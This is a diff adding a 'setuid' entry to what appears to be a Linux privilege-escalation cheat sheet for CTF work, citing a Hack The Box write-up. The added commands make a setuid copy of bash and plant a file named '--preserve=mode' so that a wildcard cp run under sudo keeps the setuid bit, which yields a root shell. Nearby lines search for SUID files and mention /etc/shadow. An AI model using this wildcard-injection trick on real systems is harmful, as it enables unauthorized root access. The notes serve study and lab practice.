@@ -185,6 +185,18 @@ find / -uid 1001 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
 
+### setuid
+
+- https://khaoticdev.net/hack-the-box-dynstr/
+    ```bash
+    # Given: `cp * ./foo/` executed by `sudo ./foo.sh`
+    cp /bin/bash .
+    chmod +s ./bash
+    touch '--preserve=mode'
+    sudo ./foo.sh
+    ./foo/bash -p  # preserves setuid
+    ```
+
 ### crypt
 
 - `/etc/shadow`:
